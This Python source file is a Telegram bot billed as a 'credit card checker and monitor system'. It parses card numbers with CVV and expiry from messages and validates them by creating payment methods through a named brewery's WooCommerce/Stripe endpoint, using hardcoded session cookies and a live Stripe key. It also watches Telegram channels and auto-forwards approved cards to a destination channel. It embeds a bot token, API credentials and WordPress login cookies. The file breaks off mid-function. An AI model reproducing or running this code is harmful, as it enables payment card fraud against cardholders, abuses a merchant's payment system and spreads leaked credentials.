import requests
import time
import re
import asyncio
import json
import os
import sys
from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram.error import TelegramError
from telethon import TelegramClient, events
from telethon.tl.types import Channel, Chat, User
from telethon.errors import SessionPasswordNeededError, FloodWaitError

# =============================================================================
# CONFIGURATION SECTION - UPDATE THESE VALUES
# =============================================================================

# Telegram API credentials from my.telegram.org
API_ID = '22411597'
API_HASH = '72c759a0fb52a7abeff239ff70d97e21'

# Bot token
BOT_TOKEN = "8360766836:AAHkG5k68O5BHbQGLO_PrZqqYq3MhCvFxkM"

# Your Telegram user ID (main admin)
MAIN_ADMIN_ID = 7802048260

# Session files
TELEGRAM_SESSION = 'telegram_session'

# Configuration files
CONFIG_FILE = 'enhanced_config.json'

# =============================================================================
# DEFAULT CONFIGURATION
# =============================================================================

DEFAULT_CONFIG = {
    "telegram_session": {
        "phone_number": None,
        "api_id": API_ID,
        "api_hash": API_HASH,
        "is_authenticated": False
    },
    "admins": [MAIN_ADMIN_ID],
    "monitoring": {
        "enabled": False,
        "monitored_channels": [],
        "destination_channel": None
    },
    "system": {
        "last_setup_step": 0,
        "current_page": 0,
        "items_per_page": 10
    }
}

# =============================================================================
# UTILITY FUNCTIONS
# =============================================================================

def load_config():
    """Load configuration from file"""
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        else:
            save_config(DEFAULT_CONFIG)
            return DEFAULT_CONFIG
    except Exception as e:
        print(f"Error loading config: {e}")
        return DEFAULT_CONFIG

def save_config(config):
    """Save configuration to file"""
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=2)
    except Exception as e:
        print(f"Error saving config: {e}")

def is_admin(user_id):
    """Check if user is admin"""
    config = load_config()
    return user_id in config["admins"]

def parse_card_from_message(text):
    """Parse various card formats from messages"""
    if not text:
        return None
    
    text = text.strip()
    
    # Pattern 1: 16 digits | MM | YY | CVV | (optional name)
    pattern1 = r'(\d{16})\s*[|]\s*(\d{1,2})\s*[|]\s*(\d{2,4})\s*[|]\s*(\d{3,4})'
    match1 = re.search(pattern1, text)
    if match1:
        card_num, month, year, cvc = match1.groups()
        if len(year) == 2:
            year = f"20{year}" if int(year) < 50 else f"19{year}"
        return f"{card_num}|{month.zfill(2)}|{year}|{cvc}"
    
    # Pattern 2: 16 digits | MM/YY | CVV | (optional name)
    pattern2 = r'(\d{16})\s*[|]\s*(\d{1,2})/(\d{2,4})\s*[|]\s*(\d{3,4})'
    match2 = re.search(pattern2, text)
    if match2:
        card_num, month, year, cvc = match2.groups()
        if len(year) == 2:
            year = f"20{year}" if int(year) < 50 else f"19{year}"
        return f"{card_num}|{month.zfill(2)}|{year}|{cvc}"
    
    # Pattern 3: Multi-line format
    lines = text.split('\n')
    if len(lines) >= 3:
        card_line = lines[0].strip()
        cvv_line = lines[1].strip()
        exp_line = lines[2].strip()
        
        card_match = re.search(r'(\d{16})', card_line)
        if not card_match:
            return None
        
        card_num = card_match.group(1)
        
        cvv_match = re.search(r'CVV:\s*(\d{3,4})', cvv_line)
        if not cvv_match:
            cvv_match = re.search(r'(\d{3,4})', cvv_line)
        if not cvv_match:
            return None
        
        cvc = cvv_match.group(1)
        
        exp_match = re.search(r'EXP:\s*(\d{1,2})/(\d{2,4})', exp_line)
        if not exp_match:
            exp_match = re.search(r'(\d{1,2})/(\d{2,4})', exp_line)
        if not exp_match:
            return None
        
        month, year = exp_match.groups()
        if len(year) == 2:
            year = f"20{year}" if int(year) < 50 else f"19{year}"
        
        return f"{card_num}|{month.zfill(2)}|{year}|{cvc}"
    
    # Pattern 4: Space separated format
    pattern4 = r'(\d{16})\s+(\d{1,2})/(\d{2,4})\s+(\d{3,4})'
    match4 = re.search(pattern4, text)
    if match4:
        card_num, month, year, cvc = match4.groups()
        if len(year) == 2:
            year = f"20{year}" if int(year) < 50 else f"19{year}"
        return f"{card_num}|{month.zfill(2)}|{year}|{cvc}"
    
    return None

# =============================================================================
# CHECKER FUNCTIONS
# =============================================================================

# Wiseacre Brewing site cookies and headers
WISEACRE_COOKIES = {
    '_fbp': 'fb.1.1760821136387.980145351698458486',
    '_ga': 'GA1.1.1926474615.1760821139',
    '_gcl_au': '1.1.668956566.1760821139',
    '_ga_X4MX4PV4RP': 'GS2.1.s1760821138$o1$g0$t1760821141$j57$l0$h0',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-10-18%2020%3A59%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwiseacrebrew.com%2F',
    'sbjs_first_add': 'fd%3D2025-10-18%2020%3A59%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwiseacrebrew.com%2F',
    'sbjs_current': 'typ%3Dreferral%7C%7C%7Csrc%3Dwiseacrebrew.com%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
    'sbjs_first': 'typ%3Dreferral%7C%7C%7Csrc%3Dwiseacrebrew.com%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%20Chrome%2F141.0.0.0%20Safari%2F537.36',
    'mtk_src_trk': '%7B%22type%22%3A%22referral%22%2C%22url%22%3A%22https%3A%2F%2Fwiseacrebrew.com%2F%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22wiseacrebrew.com%22%2C%22utm_medium%22%3A%22referral%22%2C%22utm_content%22%3A%22%2F%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Fshop.wiseacrebrew.com%2F%22%2C%22session_start_time%22%3A%222025-10-18%2020%3A59%3A04%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D',
    '__stripe_mid': 'e8951d46-1d16-4116-a35a-7b8be05c7a772426c9',
    'wordpress_sec_dedd3d5021a06b0ff73c12d14c2f177c': 'pelejab257%7C1762032175%7CmNgJQpT0a94xiyKnlVzS3CqeSQJUyppCw4NmRrsZaUv%7C35f40c1eb81ac981915fb3422fc88f95f92081ba49056a0edfae46f05c9479d8',
    'wordpress_logged_in_dedd3d5021a06b0ff73c12d14c2f177c': 'pelejab257%7C1762032175%7CmNgJQpT0a94xiyKnlVzS3CqeSQJUyppCw4NmRrsZaUv%7Caae41ceb18df452927078d0fd7ed901dcef2e6a54cbec72043f1da3e27f84587',
    '_ga_94LZDRFSLM': 'GS2.1.s1760824445$o2$g0$t1760824445$j60$l0$h0',
}

WISEACRE_HEADERS = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://shop.wiseacrebrew.com',
    'priority': 'u=1, i',
    'referer': 'https://shop.wiseacrebrew.com/account/add-payment-method/',
    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

STRIPE_HEADERS = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
}

STRIPE_PUBLIC_KEY = "pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy"

def check_card(card_number, exp_month, exp_year, cvc):
    """Check credit card using Wiseacre Brewing site's WordPress/WooCommerce setup intent API"""
    try:
        # Step 1: Create payment method using Stripe API
        stripe_data = f'type=card&card[number]={card_number}&card[cvc]={cvc}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&allow_redisplay=unspecified&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2F90ba939846%3B+stripe-js-v3%2F90ba939846%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fshop.wiseacrebrew.com&time_on_page=3174183&client_attribution_metadata[client_session_id]=a91408ea-6de3-4b0a-9216-9e8e0dba6155&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=94b65d24-19a4-416d-b0fc-b287f2691d9e&guid=52a2cfc3-910c-484c-9b29-4397e9b7898b6adb02&muid=e8951d46-1d16-4116-a35a-7b8be05c7a772426c9&sid=b07d314d-79c8-4935-a417-acef431354f2a47e66&key={STRIPE_PUBLIC_KEY}&_stripe_version=2024-06-20'
        
        stripe_response = requests.post('https://api.stripe.com/v1/payment_methods', headers=STRIPE_HEADERS, data=stripe_data)
        
        if stripe_response.status_code != 200:
            try:
                stripe_json = stripe_response.json()
                error_data = stripe_json.get('error', {})
                error_message = error_data.get('message', 'Unknown Stripe error')
                error_type = error_data.get('type', '')
                
                if error_type:
                    return f"Declined - {error_type}: {error_message}"
                else:
                    return f"Declined - {error_message}"
            except:
                return f"Declined - Stripe API error (Status: {stripe_response.status_code})"
        
        stripe_json = stripe_response.json()
        payment_method_id = stripe_json.get('id')
        
        if not payment_method_id:
            return "Declined - Invalid payment method"
        
        # Step 2: Use Wiseacre Brewing's WordPress/WooCommerce setup intent API
        wiseacre_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': '2fde965383',
        }
        
        wiseacre_response = requests.post(
            'https://shop.wiseacrebrew.com/wp/wp-admin/admin-ajax.php', 
            cookies=WISEACRE_COOKIES, 
            headers=WISEACRE_HEADERS, 
            data=wiseacre_data
        )
        
        if wiseacre_response.status_code == 200:
            try:
                wiseacre_json = wiseacre_response.json()
                
                # Check for success
                if wiseacre_json.get('success'):
                    data = wiseacre_json.get('data', {})
                    status = data.get('status', '')
                    
                    # Check if 3D Secure is required
                    if status == 'requires_action':
                        return "3D Secure Required - Card needs authentication"
                    elif status == 'succeeded':
                        return "Payment method added successful"
                    else:
                        return "Payment method added successful"
                
                # Extract exact error message from JSON structure
                error_data = wiseacre_json.get('data', {})
                
                # Check if error is nested in data.error.message structure
                if 'error' in error_data and 'message' in error_data['error']:
                    error_message = error_data['error']['message']
                elif 'message' in error_data:
                    error_message = error_data['message']
                else:
                    error_message = 'Unknown error'
                
                # Return the exact error message from Stripe
                return f"Declined - {error_message}"
                    
            except Exception as e:
                return f"Declined - Invalid response: {str(e)}"
        else:
            return "Declined - Server error"
            
    except Exception as e:
        return f"Error - {str(e)}"

def get_bin_info(card_number):
    """Get BIN information from antipublic.cc API"""
    try:
        data = requests.get('https://bins.antipublic.cc/bins/' + card_number[:6]).json()
    except Exception as e:
        data = {}
    
    brand = data.get('brand', 'Unknown')
    card_type = data.get('type', 'Unknown')
    country = data.get('country_name', 'Unknown')
    country_flag = data.get('country_flag', '🏳️')
    bank = data.get('bank', 'Unknown')
    
    return {
        'brand': brand,
        'type': card_type,
        'country': country,
        'flag': country_flag,
        'bank': bank
    }

# =============================================================================
# TELEGRAM CLIENT FUNCTIONS
# =============================================================================

async def setup_telegram_client():
    """Setup and authenticate Telegram client"""
    try:
        config = load_config()
        telegram_config = config["telegram_session"]
        
        if not telegram_config["phone_number"]:
            return None
        
        # Create client
        client = TelegramClient(TELEGRAM_SESSION, telegram_config["api_id"], telegram_config["api_hash"])
        
        # Start client
        await client.start(phone=telegram_config["phone_number"])
        
        # Check if we need 2FA
        if not await client.is_user_authorized():
            return None
        
        return client
        
    except Exception as e:
        print(f"Error setting up Telegram client: {e}")
        return None

async def authenticate_telegram_client(phone_number):
    """Authenticate Telegram client with phone number"""
    try:
        config = load_config()
        
        # Create client
        client = TelegramClient(TELEGRAM_SESSION, config["telegram_session"]["api_id"], config["telegram_session"]["api_hash"])
        
        # Start client
        await client.start(phone=phone_number)
        
        # Check if we need 2FA
        if not await client.is_user_authorized():
            return None, "Need SMS code"
        
        # Update config
        config["telegram_session"]["phone_number"] = phone_number
        config["telegram_session"]["is_authenticated"] = True
        save_config(config)
        
        await client.disconnect()
        return True, "Success"
        
    except Exception as e:
        return None, str(e)

async def verify_telegram_code(code):
    """Verify SMS code for Telegram authentication"""
    try:
        config = load_config()
        
        # Create client
        client = TelegramClient(TELEGRAM_SESSION, config["telegram_session"]["api_id"], config["telegram_session"]["api_hash"])
        
        # Start client
        await client.start(phone=config["telegram_session"]["phone_number"])
        
        # Check if we need 2FA
        if not await client.is_user_authorized():
            try:
                await client.sign_in(phone=config["telegram_session"]["phone_number"])
                await client.sign_in(code=code)
            except SessionPasswordNeededError:
                await client.disconnect()
                return None, "Need 2FA password"
        
        # Update config
        config["telegram_session"]["is_authenticated"] = True
        save_config(config)
        
        await client.disconnect()
        return True, "Success"
        
    except Exception as e:
        return None, str(e)

async def verify_telegram_password(password):
    """Verify 2FA password for Telegram authentication"""
    try:
        config = load_config()
        
        # Create client
        client = TelegramClient(TELEGRAM_SESSION, config["telegram_session"]["api_id"], config["telegram_session"]["api_hash"])
        
        # Start client
        await client.start(phone=config["telegram_session"]["phone_number"])
        
        # Check if we need 2FA
        if not await client.is_user_authorized():
            try:
                await client.sign_in(phone=config["telegram_session"]["phone_number"])
                await client.sign_in(password=password)
            except Exception as e:
                await client.disconnect()
                return None, str(e)
        
        # Update config
        config["telegram_session"]["is_authenticated"] = True
        save_config(config)
        
        await client.disconnect()
        return True, "Success"
        
    except Exception as e:
        return None, str(e)

async def list_all_chats():
    """List all chats, channels, groups, and private chats"""
    try:
        client = await setup_telegram_client()
        if not client:
            return []
        
        chats = []
        async for dialog in client.iter_dialogs():
            chat_info = {
                'id': dialog.id,
                'name': dialog.name,
                'type': 'Unknown',
                'username': None,
                'link': None
            }
            
            if isinstance(dialog.entity, Channel):
                chat_info['type'] = 'Channel'
                if hasattr(dialog.entity, 'username') and dialog.entity.username:
                    chat_info['username'] = f"@{dialog.entity.username}"
                    chat_info['link'] = f"https://t.me/{dialog.entity.username}"
            elif isinstance(dialog.entity, Chat):
                chat_info['type'] = 'Group'
            elif isinstance(dialog.entity, User):
                chat_info['type'] = 'Private Chat'
                if hasattr(dialog.entity, 'username') and dialog.entity.username:
                    chat_info['username'] = f"@{dialog.entity.username}"
                    chat_info['link'] = f"https://t.me/{dialog.entity.username}"
            
            chats.append(chat_info)
        
        await client.disconnect()
        return chats
        
    except Exception as e:
        print(f"Error listing chats: {e}")
        return []

async def handle_telegram_message(event):
    """Handle messages from monitored channels"""
    try:
        config = load_config()
        
        if not config["monitoring"]["enabled"]:
            return
        
        monitored_channels = config["monitoring"]["monitored_channels"]
        
        # Get channel info
        channel_id = event.chat_id
        
        # Check if this channel is monitored
        if channel_id not in monitored_channels:
            return
        
        # Parse card from message
        message_text = event.message.text
        if not message_text:
            return
        
        card_data = parse_card_from_message(message_text)
        if not card_data:
            return
        
        channel_title = event.chat.title if hasattr(event.chat, 'title') else "Unknown"
        print(f"🔍 Card found in {channel_title}: {card_data}")
        
        # Check card directly
        parts = card_data.split('|')
        card_number, exp_month, exp_year, cvc = parts[0], parts[1], parts[2], parts[3]
        
        result = check_card(card_number, exp_month, exp_year, cvc)
        
        if "Payment method added successful" in result:
            # Card was approved, forward to destination
            await forward_approved_card(card_data, result, config)
        else:
            print(f"❌ Card declined: {card_data}")
    
    except Exception as e:
        print(f"Error handling channel message: {e}")

async def forward_approved_card(card_data, response_text, config):
    """Forward approved card to destination channel"""
    try:
        destination = config["monitoring"]["destination_channel"]
        
        if not destination:
            print("❌ Error: Destination channel not configured!")
            return
        
        # Forward to destination channel
        client = await setup_telegram_client()
        if not client:
            return
        
        await client.send_message(
            destination,
            f"🎉 <b>APPROVED CARD FOUND!</b>\n\n{response_text}",
            parse_mode='html'
        )
        
        # Notify all admins
        for admin_id in config["admins"]:
            try:
                await client.send_message(
                    admin_id,
                    f"✅ <b>Approved card forwarded!</b>\n\nCard: <code>{card_data}</code>",
                    parse_mode='html'
                )
            except:
                pass
        
        await client.disconnect()
        print(f"✅ Approved card forwarded: {card_data}")
        
    except Exception as e:
        print(f"Error forwarding approved card: {e}")

# =============================================================================
# BOT COMMAND FUNCTIONS
# =============================================================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Unauthorized access!")
        return
    
    config = load_config()
    
    # Check if session exists
    session_exists = os.path.exists(f"{TELEGRAM_SESSION}.session")
    telegram_authenticated = config["telegram_session"]["is_authenticated"]
    
    keyboard = []
    
    if not session_exists or not telegram_authenticated:
        keyboard.append([InlineKeyboardButton("🔐 Setup Telegram Session", callback_data="setup_session")])
    else:
        keyboard.append([InlineKeyboardButton("📊 System Status", callback_data="system_status")])
        keyboard.append([InlineKeyboardButton("📋 List All Chats", callback_data="list_chats")])
        keyboard.append([InlineKeyboardButton("⚙️ Admin Settings", callback_data="admin_settings")])
        keyboard.append([InlineKeyboardButton("🔍 Monitoring Settings", callback_data="monitoring_settings")])
    
    keyboard.append([InlineKeyboardButton("❓ Help", callback_data="help")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔐 <b>Enhanced Credit Card System</b>\n\n"
        "Welcome to the unified credit card checker and monitor system!\n\n"
        "Choose an option below:",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /check command for card checking"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Unauthorized access!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ <b>Usage:</b> /check 51631030099XXXXX|08|26|155",
            parse_mode='HTML'
        )
        return
    
    card_input = ' '.join(context.args)
    await check_card_command(update, context, card_input)

async def check_card_command(update: Update, context: ContextTypes.DEFAULT_TYPE, card_input=None):
    """Main card checking function"""
    if card_input is None:
        card_input = update.message.text
    
    # Parse card input
    card_data = parse_card_from_message(card_input)
    if not card_data:
        await update.message.reply_text(
            "❌ <b>Invalid Card Format!</b>\n\n"
            "Please use format: <code>51631030099XXXXX|08|26|155</code>",
            parse_mode='HTML'
        )
        return
    
    # Send processing message
    processing_msg = await update.message.reply_text("🔄 <b>Checking card...</b>", parse_mode='HTML')
    
    start_time = time.time()
    
    # Parse card components
    parts = card_data.split('|')
    card_number = parts[0]
    exp_month = parts[1]
    exp_year = parts[2]
    cvc = parts[3]
    
    # Check card
    result = check_card(card_number, exp_month, exp_year, cvc)
    
    # Get BIN info
    bin_info = get_bin_info(card_number)
    
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Format response message
    cc = card_number
    gate = "Wiseacre Brewing"
    last = result
    
    # Determine status emoji and title based on result
    if "Payment method added successful" in result:
        status_emoji = "✅"
        status_title = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙"
    elif "3D Secure Required" in result:
        status_emoji = "🔐"
        status_title = "𝟯𝗗 𝗦𝗲𝗰𝘂𝗿𝗲"
    elif "declined" in result.lower() or "insufficient" in result.lower() or "expired" in result.lower() or "invalid" in result.lower() or "blocked" in result.lower():
        status_emoji = "❌"
        status_title = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙"
    else:
        status_emoji = "⚠️"
        status_title = "𝙀𝙧𝙧𝙤𝙧"
    
    # Format card details
    full_card = f"{cc}|{exp_month}|{exp_year}|{cvc}"
    
    msg = f'''<b>{status_emoji} {status_title} {status_emoji}</b>	   
<b>[↯] 𝗖𝗖 ⇾</b> <code>{full_card}</code>
<b>[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾</b> {gate}
<b>[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →</b> {last}
<b>[↯] 𝗕𝗜𝗡 →</b> {cc[:6]} - {bin_info['type']} - {bin_info['brand']}
<b>[↯] 𝗕𝗮𝗻𝗸 →</b> {bin_info['bank']}
<b>[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 →</b> {bin_info['country']} {bin_info['flag']}
<b>[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾</b> {"{:.1f}".format(execution_time)} seconds.
<b>𝗕𝗼𝘁 𝗕𝘆 ⇾</b> @manrsx'''
    
    # Edit the processing message with results
    await processing_msg.edit_text(msg, parse_mode='HTML')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle regular messages"""
    message_text = update.message.text
    
    # Check if message contains card pattern
    if '|' in message_text and len(message_text.split('|')) == 4:
        await check_card_command(update, context, message_text)
    else:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "Please send card in format: <code>51631030099XXXXX|08|26|155</code>\n"
            "Or use: <code>/check 51631030099XXXXX|08|26|155</code>",
            parse_mode='HTML'
        )

# =============================================================================
# CALLBACK QUERY HANDLERS
# =============================================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    if not is_admin(query.from_user.id):
        await query.edit_message_text("❌ Unauthorized access!")
        return
    
    data = query.data
    
    if data == "setup_session":
        await setup_session_menu(query)
    elif data == "system_status":
        await system_status_menu(query)
    elif data == "list_chats":
        await list_chats_menu(query)
    elif data == "admin_settings":
        await admin_settings_menu(query)
    elif data == "monitoring_settings":
        await monitoring_settings_menu(query)
    elif data == "help":
        await help_menu(query)
    elif data == "back_to_main":
        await main_menu(query)
    elif data.startswith("chat_page_"):
        page = int(data.split("_")[2])
        await list_chats_menu(query, page)
    elif data.startswith("add_channel_"):
        channel_id = int(data.split("_")[2])
        await add_channel_to_monitoring(query, channel_id)
    elif data.startswith("remove_channel_"):
        channel_id = int(data.split("_")[2])
        await remove_channel_from_monitoring(query, channel_id)
    elif data == "toggle_monitoring":
        await toggle_monitoring(query)
    elif data == "set_destination":
        await set_destination_menu(query)
    elif data == "add_admin":
        await add_admin_menu(query)
    elif data == "remove_admin":
        await remove_admin_menu(query)

async def main_menu(query):
    """Show main menu"""
    config = load_config()
    
    # Check if session exists
    session_exists = os.path.exists(f"{TELEGRAM_SESSION}.session")
    telegram_authenticated = config["telegram_session"]["is_authenticated"]
    
    keyboard = []
    
    if not session_exists or not telegram_authenticated:
        keyboard.append([InlineKeyboardButton("🔐 Setup Telegram Session", callback_data="setup_session")])
    else:
        keyboard.append([InlineKeyboardButton("📊 System Status", callback_data="system_status")])
        keyboard.append([InlineKeyboardButton("📋 List All Chats", callback_data="list_chats")])
        keyboard.append([InlineKeyboardButton("⚙️ Admin Settings", callback_data="admin_settings")])
        keyboard.append([InlineKeyboardButton("🔍 Monitoring Settings", callback_data="monitoring_settings")])
    
    keyboard.append([InlineKeyboardButton("❓ Help", callback_data="help")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "🔐 <b>Enhanced Credit Card System</b>\n\n"
        "Welcome to the unified credit card checker and monitor system!\n\n"
        "Choose an option below:",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def setup_session_menu(query):
    """Setup session menu"""
    config = load_config()
    
    keyboard = []
    
    if config["telegram_session"]["phone_number"]:
        keyboard.append([InlineKeyboardButton("📱 Enter SMS Code", callback_data="enter_sms_code")])
        keyboard.append([InlineKeyboardButton("🔑 Enter 2FA Password", callback_data="enter_2fa_password")])
    else:
        keyboard.append([InlineKeyboardButton("📱 Enter Phone Number", callback_data="enter_phone")])
    
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_to_main")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "🔐 <b>Telegram Session Setup</b>\n\n"
        "Setup your Telegram session to monitor private channels.\n\n"
        "Choose an option:",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def system_status_menu(query):
    """System status menu"""
    config = load_config()
    
    telegram_status = "✅ Authenticated" if config["telegram_session"]["is_authenticated"] else "❌ Not authenticated"
    monitoring_status = "✅ Enabled" if config["monitoring"]["enabled"] else "❌ Disabled"
    
    channels = config["monitoring"]["monitored_channels"]
    destination = config["monitoring"]["destination_channel"]
    
    channel_list = "\n".join([f"• {ch}" for ch in channels]) if channels else "None"
    
    keyboard = [
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"📊 <b>System Status</b>\n\n"
        f"<b>Telegram Session:</b> {telegram_status}\n"
        f"<b>Monitoring:</b> {monitoring_status}\n\n"
        f"<b>Monitored Channels:</b>\n{channel_list}\n\n"
        f"<b>Destination Channel:</b> {destination or 'Not set'}\n\n"
        f"<b>System Status:</b> ✅ Running",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def list_chats_menu(query, page=0):
    """List all chats menu with pagination"""
    chats = await list_all_chats()
    
    if not chats:
        keyboard = [
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "📋 <b>No chats found</b>\n\n"
            "Make sure your Telegram session is properly authenticated.",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return
    
    config = load_config()
    items_per_page = config["system"]["items_per_page"]
    start_idx = page * items_per_page
    end_idx = start_idx + items_per_page
    page_chats = chats[start_idx:end_idx]
    
    text = f"📋 <b>All Chats (Page {page + 1})</b>\n\n"
    
    keyboard = []
    
    for chat in page_chats:
        chat_text = f"{chat['type']}: {chat['name']}"
        if chat['username']:
            chat_text += f" {chat['username']}"
        chat_text += f"\nID: {chat['id']}"
        
        if chat['link']:
            chat_text += f"\nLink: {chat['link']}"
        
        text += f"{chat_text}\n\n"
        
        # Add buttons for channels and groups
        if chat['type'] in ['Channel', 'Group']:
            monitored_channels = config["monitoring"]["monitored_channels"]
            if chat['id'] in monitored_channels:
                keyboard.append([InlineKeyboardButton(f"❌ Remove {chat['name']}", callback_data=f"remove_channel_{chat['id']}")])
            else:
                keyboard.append([InlineKeyboardButton(f"➕ Add {chat['name']}", callback_data=f"add_channel_{chat['id']}")])
    
    # Pagination buttons
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"chat_page_{page-1}"))
    if end_idx < len(chats):
        nav_buttons.append(InlineKeyboardButton("➡️ Next", callback_data=f"chat_page_{page+1}"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_to_main")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def admin_settings_menu(query):
    """Admin settings menu"""
    config = load_config()
    
    admins = config["admins"]
    admin_list = "\n".join([f"• {admin}" for admin in admins])
    
    keyboard = [
        [InlineKeyboardButton("➕ Add Admin", callback_data="add_admin")],
        [InlineKeyboardButton("➖ Remove Admin", callback_data="remove_admin")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"⚙️ <b>Admin Settings</b>\n\n"
        f"<b>Current Admins:</b>\n{admin_list}\n\n"
        f"Choose an option:",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def monitoring_settings_menu(query):
    """Monitoring settings menu"""
    config = load_config()
    
    monitoring_status = "✅ Enabled" if config["monitoring"]["enabled"] else "❌ Disabled"
    channels = config["monitoring"]["monitored_channels"]
    destination = config["monitoring"]["destination_channel"]
    
    channel_list = "\n".join([f"• {ch}" for ch in channels]) if channels else "None"
    
    keyboard = [
        [InlineKeyboardButton(f"🔄 Toggle Monitoring ({monitoring_status})", callback_data="toggle_monitoring")],
        [InlineKeyboardButton("🎯 Set Destination Channel", callback_data="set_destination")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
    ]
    
